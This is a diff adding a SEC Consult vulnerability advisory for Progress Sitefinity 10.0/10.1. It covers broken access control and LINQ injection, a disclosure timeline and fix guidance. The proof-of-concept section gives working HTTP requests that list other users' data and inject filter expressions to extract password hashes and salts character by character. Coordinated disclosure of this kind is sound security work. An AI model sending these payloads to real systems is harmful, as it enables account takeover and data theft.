@@ -1,0 +1,165 @@
+id: 29015
+date: 11/17/2017
+title: Progress Sitefinity 10.0 / 10.1 Broken Access Control / LINQ Injection Vulnerability
+author: sec-consult
+cves: 
+
+=======================================================================
+              title: Broken access control & LINQ injection
+            product: Progress Sitefinity
+ vulnerable version: 10.0, 10.1
+      fixed version: >=10.1.6527.0 (internal build), 10.2
+         CVE number: -
+             impact: High
+           homepage: http://www.sitefinity.com | https://www.progress.com
+              found: 2017-08-21
+                 by: M. Li (Office Singapore)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+
+Vendor description:
+-------------------
+"Progress Sitefinity is a content management and marketing analytics
+platform designed to maximize the agility needed to succeed in todayas rapidly
+changing digital marketplace.
+It provides developers and IT teams the tools they need to support
+enterprise-level digital marketing, optimizing the customer journey by
+delivering seamless personalized experiences across different technologies and
+devices. Progress is a trusted source for the digital marketing innovation
+needed to create transformative customer experiences that fuel business
+success."
+
+Source: http://www.sitefinity.com/about
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends applying the provided patches by the vendor immediately.
+
+Additionally, there are strong indications for further vulnerabilities and it
+is highly suggested to perform a thorough security review by security
+professionals to lower the risk of using this product.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Broken Access Control
+By using an unprotected function, a low privileged user can extract another
+user's information such as email addresses, user ID, etc.
+
+
+2) LINQ Injection
+The identified LINQ injection enables an authenticated user to read sensitive
+data from the database. Specifically, an attacker can query the password
+or its hash character by character. Depending on the version of LINQ assembly
+in use, remote code execution could be possible as well.
+
+Combining the two issues, a user could escalate her privileges.
+
+
+Proof of concept:
+-----------------
+1) Broken Access Control
+A user with a low privileged role e.g. "BackendUsers" can obtain other users'
+information including email, userid etc., which is not intended for a user with
+this role. The function disclosing the information is "GenericItemsService.svc"
+laid under path "Common", which is in general not protected based on the role.
+
+GET
+/Sitefinity/Services/Common/GenericItemsService.svc/?itemType=Telerik.Sitefinity.Security.Model.User&itemSurrogateType=Telerik.Sitefinity.Security.Web.Services.WcfMembershipUser
+HTTP/1.1
+Host: [host]
+...snip...
+
+HTTP/1.1 200 OK
+...snip...
+{
+    "Context":null,
+    "IsGeneric":false,
+    "Items":[
+        ...snip...
+        {
+            ...snip...
+            "Email":"test0@local.host",
+            ...snip...
+
+            ],
+            "UserID":"cb21e9a9-992c-4f8f-9800-b03c9639b02a"
+        }
+    ],
+    "TotalCount":3
+}
+
+
+2) LINQ Injection
+The aforementioned function "GenericItemsService.svc", which can be invoked by
+any authenticated user regardless of her privilege, can be augmented by the
+parameter "filter", narrowing down the user list. However, this parameter does
+not undergo any sanitization hence properties like "password" can be queried
+character by character.
+
+For instance, the request in example 1 is asking the server whether any user
+has the password containing "2klv". Upon a correct guess, the reply contains
+matching users' attributes. By sending multiple such queries, an attacker can
+deduce the user's password hash, salt, etc. In example 2, function "Users.svc"
+can be used only by users with administrator privilege.
+
+It could also be possible to extract the password in cleartext, if the default
+setting for membership format is changed.
+
+Furthermore, depending on the third party assembly System.Linq, the issue
+could be abused to execute code on the server.
+
+
+Example 1:
+GET
+/Sitefinity/Services/Common/GenericItemsService.svc/?itemType=Telerik.Sitefinity.Security.Model.User&itemSurrogateType=Telerik.Sitefinity.Security.Web.Services.WcfMembershipUser&filter=(password.ToUpper().Contains(%222klv%22.ToUpper()))
+HTTP/1.1
+
+Example 2:
+GET
+/Sitefinity/Services/Security/Users.svc/?roleId=&roleProvider=&forAllProviders=false&filter=(salt.ToUpper().Contains(%225d%22.ToUpper()))
+HTTP/1.1
+
+
+Vulnerable / tested versions:
+-----------------------------
+Progress Sitefinity 10.0 and 10.1 have been tested. Version 10.1 was the latest
+at the time the vulnerability was discovered. It is assumed earlier versions
+of this product are also vulnerable to the issues.
+
+
+Vendor contact timeline:
+------------------------
+2017-08-22: Contacting vendor through email
+2017-08-23: Contacting vendor's security group
+2017-08-23: Sending unencrypted advisory to Sitefinity Product Management
+            as requested by vendor
+2017-08-28: Vendor acknowledged the issues
+2017-10-17: Asking for update. Vendor replies that a fix will be released within
+            2-3 weeks
+2017-11-06: Vendor states the issues are fixed in version 10.1.6527.0
+2017-11-14: Asking vendor where fixed version can be found
+2017-11-14: Vendor releases version 10.2
+2017-11-16: Coordinated release of security advisory
+
+
+Solution:
+---------
+According to the vendor, all the identified issues have been fixed in
+version 10.1.6527.0 (internal build) and release 10.2.
+
+https://www.sitefinity.com/product/version-notes/sitefinity-10.2
+https://www.sitefinity.com/developer-network/forums/internal-builds/sitefinity-10.1-internal-builds#Hlb1FcE3622pWP8AAERlJg
+
+Please update to the latest version immediately.
+
+#  0day.today [2023-03-25]  #
